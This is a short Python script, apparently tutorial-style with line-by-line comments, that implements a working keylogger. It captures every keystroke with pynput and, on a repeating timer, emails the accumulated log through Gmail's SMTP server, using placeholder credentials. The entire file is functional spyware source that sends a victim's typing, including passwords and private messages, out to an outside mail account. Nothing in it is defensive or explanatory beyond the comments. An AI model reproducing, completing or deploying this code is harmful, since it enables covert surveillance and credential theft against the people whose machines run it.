#!/usr/bin/env python
import pynput.keyboard  # Import the pynput.keyboard library for keylogging
import threading  # Import the threading module for running functions concurrently
import smtplib  # Import the smtplib library for sending emails

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"  # Initialize the log with a start message
        self.interval = time_interval  # Set the time interval for reporting
        self.email = email  # Store the email address for sending logs
        self.password = password  # Store the email password for authentication

    def append_to_log(self, string):
        self.log = self.log + string  # Append text to the log

    def process_key_press(self, key):
        try:
            current_key = str(key.char)  # Try to get the character representation of the pressed key
        except AttributeError:
            if key == key.space:
                current_key = " "  # Replace the space key with a space character
            else:
                current_key = " " + str(key) + " "  # Wrap other keys in spaces for readability
        self.append_to_log(current_key)  # Append the pressed key to the log

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)  # Send the log via email
        self.log = ""  # Clear the log after sending
        timer = threading.Timer(self.interval, self.report)  # Create a timer to schedule the next report
        timer.start()  # Start the timer

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server connection
        server.starttls()  # Start TLS encryption for secure communication
        server.login(email, password)  # Log in to the email account
        server.sendmail(email, email, message)  # Send the email with the log
        server.quit()  # Quit the SMTP server

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)  # Create a keyboard listener
        with keyboard_listener:
            self.report()  # Start reporting keylogs
            keyboard_listener.join()  # Join the keyboard listener thread

# Create an instance of the Keylogger class and start the keylogging process
keylogger = Keylogger(120, "your_email@gmail.com", "your_password")
keylogger.start()
